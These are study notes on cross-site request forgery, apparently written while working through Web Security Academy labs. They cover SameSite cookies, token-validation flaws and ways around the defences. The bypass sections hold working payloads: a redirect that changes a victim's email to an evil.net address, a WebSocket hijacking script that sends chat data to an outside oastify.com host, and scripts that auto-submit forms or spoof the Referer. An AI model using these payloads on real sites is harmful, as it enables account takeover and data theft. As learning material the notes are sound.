# CSRF (Cross-Site Request Forgery)

## Overview
- **Definition**: CSRF is a web security vulnerability that allows an attacker to induce users to perform unintended actions on a web application where they are authenticated.
- **Prerequisites for Vulnerability**:
  - A relevant action (e.g., changing email address).
  - Cookie-based session handling.
  - No unpredictable request parameters.
- **Other Contexts**:  
  Although CSRF is normally described in relation to cookie-based session handling, it also arises in other contexts where the application automatically adds user credentials to requests, such as:
  - HTTP Basic authentication
  - Certificate-based authentication

---

## Attack Method
1. The attacker's page triggers an HTTP request to the vulnerable website.
2. If the user is logged in, their browser **automatically includes the session cookie** (unless SameSite is enforced).
3. The vulnerable site processes the request as if it came from the victim, e.g., changes their email.

## Defenses

### CSRF Tokens
- **Purpose**: Unique, secret, unpredictable value generated by the server and shared with the client.
- **Common Implementation**: Hidden input field in HTML forms.

```html
<input type="hidden" name="csrf_token" value="a1b2c3d4e5f6...">
```

---

### SameSite Cookies
- **Definition**: Browser mechanism controlling when cookies are sent in cross-site requests.
- **Default in Chrome**: `Lax`

#### SameSite Attribute Values

| Value   | Behavior |
|--------|---------|
| `Strict` | Never sent on cross-site requests (even top-level navigation) |
| `Lax`    | Sent only on **safe** requests: <br> • GET method <br> • Top-level navigation (e.g., clicking a link) |
| `None`   | Sent on all cross-site requests <br> **Requires `Secure`** (HTTPS only) |

**Examples**:
```http
Set-Cookie: session=0F8tgdOhi9ynR1M9wa3ODa; SameSite=Strict
```
```http
Set-Cookie: trackingId=0F8tgdOhi9ynR1M9wa3ODa; SameSite=None; Secure
```

### Site vs Origin (Diagram Explanation)

```text
Site: https://app.example.com
├── scheme: https
├── +1 TLD: example.com
└── site: app.example.com

Origin: https://app.example.com:443
└── Full match required (scheme + host + port)
```

- **Site**: Encompasses multiple subdomains under the same registrable domain.
- **Origin**: Exact match of scheme, host, and port.
- **Key Insight**:  
  A **cross-origin** request can still be **same-site**, but **not vice versa**.

#### SameSite Request Examples

| From | To | Same-site? | Same-origin? |
|------|----|------------|--------------|
| `https://app.example.com` | `https://intranet.example.com` | Yes | No |
| `https://app.example.com` | `https://example.com:8080` | Yes | No |
| `https://app.example.com` | `http://example.com` | No | No |

## Vulnerabilities in CSRF Protection

- Validates token on `POST` but **skips on `GET`**
- Validates token when **present**, but **skips if omitted**
- Uses **global token pool** — any valid token accepted, not tied to user session
- Token tied to **non-session cookie**
- Token **duplicated in a cookie** → attacker can:
  1. Invent a token
  2. Use cookie-setting endpoint to inject it
  3. Use it in CSRF attack

## Bypassing Defenses

### Bypassing SameSite Lax
- **Using GET requests** (allowed in top-level navigation)
- **Method override parameters** (e.g., Symfony’s `_method`)
  ```html
  <input type="hidden" name="_method" value="POST">
  ```

- **On-site gadgets (client-side redirects)**

```html
<script>
document.location = 
"https://0aac00b60379f3de836bb98f005b00b0.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=hacked@evil.net&submit=1";
</script>
```

---

### Cross-Site WebSocket Hijacking (CSWSH)
> A CSRF attack targeting WebSocket handshakes.

- **Conditions**:
  - WebSocket lacks Origin header validation
  - No CSRF token required

#### Exploit Example (URL-encoded payload in login redirect)

```html
<script>
document.location = "https://cms-0aa900d9043da57780590d18001100d7.web-security-academy.net/login?username=%3Cscript%3Evar%20ws%20%3D%20new%20WebSocket%28%27wss%3A%2F%2F0aa900d9043da57780590d18001100d7.web-security-academy.net%2Fchat%27%29%3B%20ws.onopen%20%3D%20function%28%29%20%7B%20ws.send%28%22READY%22%29%3B%20%7D%3B%20ws.onmessage%20%3D%20function%28event%29%20%7B%20fetch%28%27https%3A%2F%2Feasjtqnyoc3q2mim58guhzfef5lw9rxg.oastify.com%27%2C%20%7Bmethod%3A%20%27POST%27%2C%20mode%3A%20%27no-cors%27%2C%20body%3A%20event.data%7D%29%3B%20%7D%3B%3C%2Fscript%3E&password=anything";
</script>
```

## Bypassing Referer-Based Validation

### Auto-Submit After DOM Load
```html
<script>
// Auto-submit after DOM is parsed
document.addEventListener('DOMContentLoaded', function () {
    document.forms[0].submit();
});
</script>
```

---

### Broken Referer Validation (Spoof Address Bar)
```html
<script>
// Run after DOM is ready
document.addEventListener('DOMContentLoaded', function () {
    // Spoof visible URL without reload
    history.pushState('', '', '/?0aa100d4032a7c62801e30d9006300a9.web-security-academy.net');
    // Submit form
    document.forms[0].submit();
});
</script>
```
